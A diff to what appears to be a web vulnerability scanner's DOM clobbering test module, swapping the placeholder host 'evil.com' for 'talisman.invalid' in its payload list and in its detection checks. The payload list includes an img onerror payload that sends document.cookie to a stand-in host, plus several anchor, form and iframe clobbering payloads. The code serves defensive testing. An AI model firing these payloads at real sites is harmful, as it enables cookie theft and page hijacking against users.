@@ -36,12 +36,12 @@ DOM_CLOBBERING_PAYLOADS = [
     # Script-like elements without being script
     ('<img id="canaryID" src="x" onerror="fetch(\'https://talisman.invalid/\'%2Bdocument.cookie)">', "Img onerror clobbering"),
     # Overwriting document API
-    ('<a id="cookie" href="https://evil.com">cookie</a>', "document.cookie clobbering"),
-    ('<a id="getElementById" href="https://evil.com">getElementById</a>', "document.getElementById clobbering"),
+    ('<a id="cookie" href="https://talisman.invalid">cookie</a>', "document.cookie clobbering"),
+    ('<a id="getElementById" href="https://talisman.invalid">getElementById</a>', "document.getElementById clobbering"),
     # Multiple nested clobbering
     ('<form id="canaryID"><input name="default" value="clobbered"></form>', "Form child element clobbering"),
     # Iframe name-based
-    ('<iframe name="canaryID" src="https://evil.com"></iframe>', "Iframe name clobbering"),
+    ('<iframe name="canaryID" src="https://talisman.invalid"></iframe>', "Iframe name clobbering"),
 ]
 
 
@@ -96,9 +96,9 @@ async def _test_dom_clobbering(
                 if canary_id in resp_text:
                     # Determine what type of clobbering vector this is
                     clobbering_type = "unknown"
-                    if 'href="https://evil.com' in resp_text:
+                    if 'href="https://talisman.invalid' in resp_text:
                         clobbering_type = "anchor_href_clobbering"
-                    elif 'action="https://evil.com' in resp_text:
+                    elif 'action="https://talisman.invalid' in resp_text:
                         clobbering_type = "form_action_clobbering"
                     elif 'base' in payload.lower():
                         clobbering_type = "base_tag_clobbering"
